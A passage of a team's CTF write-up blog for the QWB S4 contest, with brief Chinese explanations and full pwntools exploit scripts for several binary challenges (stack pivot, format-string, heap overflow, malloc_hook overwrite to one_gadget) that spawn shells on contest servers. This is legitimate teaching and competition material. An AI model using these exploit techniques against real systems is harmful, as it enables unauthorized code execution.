class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + sha1(long_to_bytes(<span class="built_in">min</span>(p,q))).hexdigest() + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="comment"># 27152 175947855464630318882274211369050447335314682338022384131546160543733195355501291230119719123032944939427500196558321955068490980548179604648557892933129317527213012520680627573834567002223872890806611275061140244033706361520509332755932759567357620312030849014630507761409535339555754829420991613721802012281</span></span><br><span class="line"><span class="comment"># flag&#123;601cb6f6d990ed5b89cf0de60508a95c07543793&#125;</span></span><br></pre></td></tr></table></figure>
<h3><span id="babymessage">babymessage</span><a href="#babymessage" class="header-anchor"></a></h3><p>可以覆盖ebp，因为没开pie，所以直接栈迁移到bss上导致了第二次调用时候会栈溢出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=process(&#x27;./babymessage&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;123.56.170.202&#x27;</span>,<span class="number">21342</span>)</span><br><span class="line">main_addr=<span class="number">0x00000000040091A</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave_name</span>(<span class="params">name</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;choice&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;name&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lmessage</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;choice&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;message&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;choice&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gd</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(r,cmd)</span><br><span class="line">    pause()</span><br><span class="line">pd=<span class="number">0x0000000000400ac3</span></span><br><span class="line">psr=<span class="number">0x0000000000400ac1</span></span><br><span class="line">backdoor=<span class="number">0x000000000040080A</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babymessage&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">leave_name(<span class="string">&#x27;$0&#x27;</span>)</span><br><span class="line">lmessage(<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x6010d0</span>+<span class="number">4</span>))</span><br><span class="line">lmessage(<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x6010d0</span>+<span class="number">4</span>)+p64(pd)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(pd)+p64(<span class="number">0x100</span>)+p64(backdoor))</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;leak &#x27;</span>+<span class="built_in">hex</span>(leak)</span><br><span class="line">lbase=leak-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;lbase &#x27;</span>+<span class="built_in">hex</span>(lbase)</span><br><span class="line">sys=lbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one=<span class="number">0x10a45c</span>+lbase</span><br><span class="line"><span class="comment">#gd(&#x27;b *0x0000000000400886&#x27;)</span></span><br><span class="line">r.send(<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x6010d0</span>+<span class="number">4</span>)+p64(one))</span><br><span class="line"><span class="comment">#r.send(&#x27;b&#x27;*8+p64(0x6010d0+4)+p64(pd)+p64(0x00000000006010D0)+p64(sys))</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3><span id="bank">bank</span><a href="#bank" class="header-anchor"></a></h3><p>no negative check for amount</p>
<p>transact<br>Alice -1000<br>get flag</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_28920235447ac58455a8fc5ce744baac.png"></p>
<h3><span id="hong-fang-fu-zhu">红方辅助</span><a href="#hong-fang-fu-zhu" class="header-anchor"></a></h3><p>分析一下流量的格式，解解密就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5, sha256</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetSalt</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>((md5(sha256(data.encode()).digest())).hexdigest(), <span class="number">16</span>) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">funcs = &#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span> : <span class="keyword">lambda</span> x, y : x - y,</span><br><span class="line">    <span class="string">&quot;1&quot;</span> : <span class="keyword">lambda</span> x, y : x + y,</span><br><span class="line">    <span class="string">&quot;2&quot;</span> : <span class="keyword">lambda</span> x, y : x ^ y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inv_func = &#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span> : <span class="keyword">lambda</span> x, y : x + y,</span><br><span class="line">    <span class="string">&quot;1&quot;</span> : <span class="keyword">lambda</span> x, y : x - y,</span><br><span class="line">    <span class="string">&quot;2&quot;</span> : <span class="keyword">lambda</span> x, y : x ^ y,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">offset = &#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span> : <span class="number">0xefffff</span>,</span><br><span class="line">    <span class="string">&quot;1&quot;</span> : <span class="number">0xefffff</span>,</span><br><span class="line">    <span class="string">&quot;2&quot;</span> : <span class="number">0xffffff</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;socket.data&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> index &lt; <span class="built_in">len</span>(data)-<span class="number">100</span>:</span><br><span class="line">    header = data[index:index+<span class="number">19</span>]</span><br><span class="line">    data_length = <span class="built_in">int</span>.from_bytes(header[<span class="number">13</span>:<span class="number">17</span>], byteorder=<span class="string">&#x27;little&#x27;</span>) - <span class="number">10</span></span><br><span class="line">    <span class="comment"># print(data_length)</span></span><br><span class="line"></span><br><span class="line">    btime = header[<span class="number">1</span>:<span class="number">1</span>+<span class="number">4</span>]</span><br><span class="line">    fn   = <span class="built_in">chr</span>(<span class="built_in">int</span>(header[<span class="number">17</span>]))</span><br><span class="line"></span><br><span class="line">    t = struct.unpack(<span class="string">&quot;&lt;i&quot;</span>, btime)[<span class="number">0</span>]</span><br><span class="line">    boffset = offset[fn]</span><br><span class="line">    t -= boffset</span><br><span class="line">    t = struct.pack(<span class="string">&quot;&lt;i&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">    salt = <span class="built_in">int</span>(header[<span class="number">18</span>])</span><br><span class="line">    cipher = data[index+<span class="number">19</span>:index+<span class="number">19</span>+data_length]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(salt, t, cipher)</span></span><br><span class="line">    plain = <span class="string">&quot;&quot;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">        plain += <span class="built_in">chr</span>(((inv_func[fn](c, salt)) ^ t[i]) % <span class="number">256</span>)</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">4</span></span><br><span class="line">    <span class="built_in">print</span>(plain)</span><br><span class="line"></span><br><span class="line">    index += <span class="number">9</span> + <span class="number">10</span> + data_length + <span class="number">4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://hackmd.summershrimp.com/uploads/upload_dd2a1b0987a7931fcf7479b8dbd231a6.png"></p>
<p>得到3e752bf509ddb4e9a42f1ef30beff495</p>
<p>flag提交一直不对，改一下格式即可：QWB{3e752bf509ddb4e9a42f1ef30beff495}</p>
<h3><span id="siri-qiang-wang-xian-feng">Siri - 强网先锋</span><a href="#siri-qiang-wang-xian-feng" class="header-anchor"></a></h3><p>一个简单的格式化字符串,leak了stack地址之后就是对上面的地址进行一个返回地址和保存的rbp进行一个修改,通过抬栈 执行 one_gadget</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;123.56.170.202&#x27;</span>,<span class="number">12124</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;Hey Siri!&#x27;</span>)</span><br><span class="line">offset = <span class="number">14</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;Remind me to  &#x27;</span> + <span class="string">&#x27;BBBBAAAAAAAAStack:%46$pLIBC:%83$pPROC:%47$pCanary:%45$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Stack:&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">288</span></span><br><span class="line">log.info(<span class="string">&#x27;Stack:\t&#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;LIBC:&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">231</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;LIBC:\t&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;PROC:&#x27;</span>)</span><br><span class="line">proc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x144C</span></span><br><span class="line">log.info(<span class="string">&#x27;Proc:\t&#x27;</span> + <span class="built_in">hex</span>(proc_base))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Canary:&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;Canary:\t&#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">pop_rdi_ret = proc_base  + <span class="number">0x0152B</span></span><br><span class="line">leave_ret = proc_base + <span class="number">0x12E2</span></span><br><span class="line">rce = libc_base + <span class="number">0x10A45C</span></span><br><span class="line">open_sys = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_sys = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;Hey Siri!&#x27;</span>)</span><br><span class="line">off_1 = (((stack + <span class="number">0x50</span>)&amp;<span class="number">0xFFFF</span>))</span><br><span class="line">off_2 = (leave_ret&amp;<span class="number">0xFFFF</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x5555555552A2&#x27;)</span></span><br><span class="line"><span class="keyword">if</span> off_1 &gt; off_2:</span><br><span class="line">	payload  = <span class="string">&#x27;Remind me to &#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((off_2 - <span class="number">27</span>)) + <span class="string">&#x27;c%55$hn&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((off_1 - off_2)) + <span class="string">&#x27;c%56$hn&#x27;</span></span><br><span class="line">	payload  = payload.ljust(<span class="number">0x38</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	payload += p64(stack + <span class="number">8</span>) + p64(stack)</span><br><span class="line">	payload += p64(rce)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	payload  = <span class="string">&#x27;Remind me to &#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((off_1 - <span class="number">27</span>)) + <span class="string">&#x27;c%55$hn&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((off_2 - off_1)) + <span class="string">&#x27;c%56$hn&#x27;</span></span><br><span class="line">	payload  = payload.ljust(<span class="number">0x38</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	payload += p64(stack) + p64(stack + <span class="number">8</span>)</span><br><span class="line">	payload += p64(rce)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3><span id="just-a-galgame-qiang-wang-xian-feng">Just a Galgame - 强网先锋</span><a href="#just-a-galgame-qiang-wang-xian-feng" class="header-anchor"></a></h3><p>如果top_chunk的size 不够申请的大小,就会另外开辟一个top_chunk,将原先top_chunk扔进unsorted bin,切割后拿到libc_base,在case 5有个read(0,0x4040A0,8);往栈上写一个地址,然乎case 2没有对 index 索引进行一个 检测 越界修改这个地址里面的内容,即可将malloc_hook写为rce</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level =<span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">ch</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>():</span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,name</span>):</span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;idx &gt;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;movie name &gt;&gt; &#x27;</span>,name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">large</span>():</span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>(<span class="params">say</span>):</span><br><span class="line">	menu(<span class="number">5</span>)</span><br><span class="line">	p.sendafter(<span class="string">&#x27;QAQ\n&#x27;</span>,say)</span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;123.56.170.202&#x27;</span>,<span class="number">52114</span>)</span><br><span class="line">libc =ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">new()</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xD41</span>))</span><br><span class="line">large()</span><br><span class="line">new()</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7F&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]  -<span class="number">0x10</span> - <span class="number">1632</span></span><br><span class="line">log.info(<span class="string">&#x27;LIBC:\t&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">rce = libc_base + <span class="number">0x10A45C</span></span><br><span class="line">leave(p64(malloc_hook - <span class="number">0x60</span>))</span><br><span class="line">edit(<span class="number">8</span>,p64(rce))</span><br><span class="line">new()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3><span id="babynotes-qiang-wang-xian-feng">babynotes - 强网先锋</span><a href="#babynotes-qiang-wang-xian-feng" class="header-anchor"></a></h3><p>因为在regset中 strcpy 可以导致堆溢出修改下一个块的size,则可构造 chunk overlap,然后往malloc_hook中写入rce</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level =&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">ch</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index,size</span>):</span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;note:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Set</span>(<span class="params">name,motto,age</span>):</span><br><span class="line">	p.sendafter(<span class="string">&#x27;name:&#x27;</span>,name)</span><br><span class="line">	p.sendafter(<span class="string">&#x27;motto:&#x27;</span>,motto)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;age:&#x27;</span>,<span class="built_in">str</span>(age))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">	menu(<span class="number">6</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc =ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;123.56.170.202&#x27;</span>,<span class="number">43121</span>)</span><br><span class="line"><span class="type">Set</span>(<span class="string">&#x27;FMYY&#x27;</span>,<span class="string">&#x27;FAQ&#x27;</span>,<span class="number">0x21</span>)</span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x18</span>)</span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">4</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7F&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x10</span> - <span class="number">88</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;LIBC:\t&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">rce= libc_base + <span class="number">0xF1207</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line"><span class="type">Set</span>(<span class="string">&#x27;U&#x27;</span>*<span class="number">0x18</span>,<span class="string">&#x27;FAQ&#x27;</span>,<span class="number">0xE1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x60</span>) <span class="comment"># 1 = 3</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">new(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span> + p64(rce))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
</div><div class="article-licensing box"><div class="licensing-title"><p>强网杯 S4 SU Write-Up</p><p><a href="https://team-su.github.io/posts/48139.html">https://team-su.github.io/posts/48139.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2020-08-24</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-07-13</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/QWB/">QWB</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/posts/31796.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">第四届“强网”拟态防御国际精英挑战赛 SU Write-Up</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/50874.html"><span class="level-item">WMCTF 2020 SU Write-Up</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p 